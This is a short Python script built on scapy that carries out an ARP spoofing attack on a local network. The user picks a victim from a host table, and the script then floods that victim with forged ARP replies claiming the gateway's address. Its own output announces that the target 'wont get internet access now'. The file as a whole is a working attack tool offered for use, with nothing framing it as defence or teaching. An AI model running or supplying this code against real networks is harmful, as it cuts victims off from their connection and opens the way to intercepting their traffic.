from scapy.all import *
import time 
import os 
from utils import get_info, get_ip, get_mac 
#need to increase efficiency of program using threads.
#better ui
def main():
    try:
        print("[+] ARP Spoofer starting soon ... , press ctrl+c to stop")
        time.sleep(3)
        os.system("cls")
        mm = str(input("Enter your mac address (use ipconfig /all in terminal if you dont know about it!) - "))
        mm = mm.replace("-",":")
        os.system("cls")
        h = get_info()
        print("From the table....")
        print("\n")
        id = int(input("[?] Enter target id - "))

        tm = str(get_mac(h[id]))
        gip  = str(input("[?] Enter gateway ip (default  - 192.168.0.1) - "))
        tip  = str(get_ip(h[id]))

        def send_arp_pkt(my_mac , target_mac , gateway_ip , target_ip):
                flag = 0 # time sequence checker var
                #creating packet layers
                p1  =  Ether()
                p1.src  = my_mac
                p1.dst = target_mac


                p2 = ARP()
                p2.psrc =  gateway_ip
                p2.hwsrc =  my_mac
                p2.pdst =  target_ip
                p2.hwdst =  target_mac
                p2.op = 2 # operation code is 2
                t1 = time.time()
                #sending unlimited ARP spoofer packet.
                pkt = p1/p2
                while 1:
                    t2 = time.time()
                    sendp(pkt , verbose = False)
                    if(int(t2-t1)>=10 and flag == 0):
                        os.system("cls")
                        print("[+] Your target wont get internet access now :) (Continue the program to prevent access)")
                        flag = 1
                    elif(int(t2-t1)<10 and flag == 0):
                        print("[+] Sent ARP packet")
        send_arp_pkt( mm,tm ,gip ,tip)

    except KeyboardInterrupt:
        exit(0)
        #os.system("exit")
        #pass
    except Exception as e:
        print(e) 

if (__name__=="__main__"):
    main()